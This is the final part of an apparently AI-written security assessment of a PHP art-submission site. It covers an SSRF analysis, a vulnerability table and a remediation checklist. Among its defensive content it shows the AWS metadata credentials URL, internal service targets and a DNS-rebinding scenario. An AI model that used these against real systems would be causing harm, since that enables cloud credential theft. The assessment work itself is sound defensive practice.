**Recommended CSP:**
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://unpkg.com https://cdn.jsdelivr.net;
  style-src 'self' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data:;
  connect-src 'self';
  frame-ancestors 'none';
```

This would prevent XSS exploitation by blocking inline scripts.

## 10. SSRF Sinks

### 10.1 HTTP Client Usage Analysis

The application uses **GuzzleHttp** for HTTP requests, primarily for OAuth communication.

#### 10.1.1 OAuth HTTP Requests

**Location:** /repos/bybrynn-core/vendor/league/oauth2-client/src/Provider/AbstractProvider.php

**Request Types:**
1. **Authorization URL Generation** (no outbound request)
2. **Token Exchange Request:**
   ```php
   POST https://login.microsoftonline.com/{$tenantId}/oauth2/v2.0/token
   ```
3. **Resource Owner Request:**
   ```php
   GET https://graph.microsoft.com/oidc/userinfo
   ```

**User Input Control:**
- URLs are **hardcoded** in submissions.php (lines 41-43)
- Tenant ID is **hardcoded**: cd47551c-33c7-4b7f-87a9-df19f9169121
- No user input controls OAuth endpoints

**SSRF Risk:** LOW (URLs are not user-controllable)

### 10.2 Direct SSRF Sinks

#### 10.2.1 file_get_contents()

**Usage in Code:**

1. **submissions.php line 165** (Safe - local file):
   ```php
   $raw = file_get_contents($entriesFile);
   ```

2. **submissions.php line 226** (Safe - local file):
   ```php
   $html = file_get_contents($indexFile);
   ```

3. **thumb.php** - Not used for URL fetching

**Analysis:** All file_get_contents() calls operate on local files with controlled paths. No SSRF risk.

#### 10.2.2 curl Functions

**Location:** /repos/bybrynn-core/vendor/guzzlehttp/guzzle/src/Handler/CurlHandler.php

```php
\curl_exec($easy->handle);
```

**Usage Context:**
- Wrapped by Guzzle's HTTP client abstraction
- Used by OAuth library for token requests
- URLs controlled by OAuth configuration (hardcoded)

**SSRF Risk:** LOW (no user-controllable URLs)

### 10.3 Potential SSRF Attack Vectors

#### 10.3.1 OAuth Redirect URI Manipulation

**Location:** submissions.php line 31

```php
$redirectUri  = 'https://bybrynn.com/submissions';
```

**Analysis:**
- Redirect URI is **hardcoded**
- Not influenced by user input
- Must match Azure AD app registration

**SSRF Risk:** NONE

#### 10.3.2 OAuth State Parameter

**Location:** submissions.php lines 55, 60

```php
$_SESSION['oauth2state'] = $provider->getState();
// ... later ...
if (empty($_GET['state']) || ($_GET['state'] !== ($_SESSION['oauth2state'] ?? null))) {
```

**Analysis:**
- State is server-generated random value
- Properly validated
- Not used in HTTP requests

**SSRF Risk:** NONE

#### 10.3.3 Image URL Handling

**Analysis:**
- Images are uploaded as files (multipart/form-data)
- No URL-based image fetching
- No image proxy functionality

**SSRF Risk:** NONE

### 10.4 Indirect SSRF Vectors

#### 10.4.1 DNS Rebinding (Theoretical)

**Scenario:**
If the application performed URL-based image fetching (which it doesn't), an attacker could:
1. Register domain pointing to public IP
2. Submit URL to application
3. During fetch, DNS changes to internal IP (e.g., 169.254.169.254)
4. Application fetches internal AWS metadata

**Current Risk:** N/A (no URL fetching)

#### 10.4.2 Guzzle SSRF via OAuth

**Theoretical Attack:**
If an attacker could control the OAuth configuration (which they can't due to hardcoding), they could:
1. Point authorization/token URLs to internal services
2. Exfiltrate data via OAuth flow

**Current Risk:** N/A (URLs hardcoded)

### 10.5 SSRF Attack Surface Summary

| Component | User Control | SSRF Risk | Notes |
|-----------|--------------|-----------|-------|
| OAuth URLs | None | NONE | Hardcoded |
| file_get_contents() | Path only (safe) | NONE | Local files only |
| Guzzle HTTP Client | None | NONE | Used for OAuth only |
| Image uploads | File upload | NONE | No URL fetching |
| Thumbnail generation | Local paths | NONE | GD library |

### 10.6 AWS Metadata Service (IMDS)

**Relevance:** If application is hosted on AWS EC2

**Attack Vector:**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Current Risk:** NONE (no SSRF vulnerabilities identified)

**Defense in Depth Recommendation:**
- Enable IMDSv2 (requires session token)
- Block 169.254.169.254 in firewall rules

### 10.7 Internal Service Discovery

**Potential Internal Targets if SSRF existed:**
- Redis: redis://127.0.0.1:6379
- MySQL: mysql://127.0.0.1:3306
- Memcached: memcache://127.0.0.1:11211
- Elasticsearch: http://127.0.0.1:9200
- Internal APIs: http://127.0.0.1:*

**Current Risk:** NONE (no SSRF vulnerabilities)

### 10.8 SSRF Conclusion

**Overall SSRF Risk: NONE**

The application does not contain any exploitable SSRF vulnerabilities because:
1. All HTTP requests use hardcoded URLs
2. No user input controls external request destinations
3. No URL-based resource fetching functionality
4. file_get_contents() only accesses local files with validated paths

**Recommendation:** Maintain this security posture if URL-based features are added in the future. Implement URL allowlisting and SSRF protection measures.

---

## Appendix A: Vulnerability Summary

| # | Vulnerability | File | Line(s) | CVSS | Priority |
|---|--------------|------|---------|------|----------|
| 1 | PHP Code Injection (RCE) | submissions.php | 129, 236 | 10.0 | P0 |
| 2 | OAuth Credential Exposure | env.php | 3-4 | 10.0 | P0 |
| 3 | Authentication Bypass | submissions.php | 121-253 | 9.1 | P0 |
| 4 | Session Hijacking (logging) | submissions.php | 14-21 | 9.3 | P0 |
| 5 | DOM-based XSS (stored) | art-renders.js | 23 | 8.2 | P1 |
| 6 | phpinfo() Disclosure | info.php | 2 | 7.5 | P1 |
| 7 | Debug Mode Enabled | submissions.php | 80-82 | 5.3 | P2 |
| 8 | JSON Injection | submissions.php | 207-223 | 6.5 | P2 |
| 9 | Missing CSP | All HTML | N/A | 4.3 | P3 |
| 10 | Missing SRI | All HTML | N/A | 4.3 | P3 |

**Total Critical Vulnerabilities:** 5
**Total High Vulnerabilities:** 2
**Total Medium Vulnerabilities:** 2
**Total Low Vulnerabilities:** 2

---

## Appendix B: Remediation Checklist

### Immediate Actions (Before Production)

- [ ] **DELETE /repos/bybrynn-core/env.php** or move outside webroot
- [ ] **DELETE /repos/bybrynn-core/info.php**
- [ ] Fix code injection in submissions.php line 236:
  ```php
  $date = preg_match('/^\d{4}-\d{2}-\d{2}$/', $_POST['date'] ?? '')
    ? $_POST['date']
    : date('Y-m-d');
  ```
- [ ] Implement authentication check in POST handler (submissions.php line 121)
- [ ] Remove session debug logging (submissions.php lines 14-21)
- [ ] Fix XSS in art-renders.js line 23:
  ```javascript
  document.getElementById("art-subheading").textContent = entry.subheading;
  ```
- [ ] Disable display_errors in production

### Short-term Actions (Week 1)

- [ ] Implement proper authorization checks
- [ ] Add input validation and sanitization for all POST parameters
- [ ] Implement rate limiting on submissions endpoint
- [ ] Add Content-Security-Policy header
- [ ] Add Subresource Integrity hashes to CDN resources
- [ ] Block /vendor/ directory via .htaccess
- [ ] Implement session regeneration after authentication
- [ ] Add CSRF token protection

### Medium-term Actions (Month 1)

- [ ] Run `composer audit` and update vulnerable dependencies
- [ ] Implement file upload security (magic byte verification, size limits)
- [ ] Add CAPTCHA to submission form
- [ ] Implement structured logging (not to web-accessible file)
- [ ] Add security headers (HSTS, X-Frame-Options, etc.)
- [ ] Conduct full penetration test
- [ ] Implement Web Application Firewall (WAF)

---

**Document Version:** 1.0
**Assessment Date:** 2026-02-12
**Assessed By:** Claude Sonnet 4.5 (Security Analysis Agent)
**Classification:** CONFIDENTIAL - SECURITY ASSESSMENT
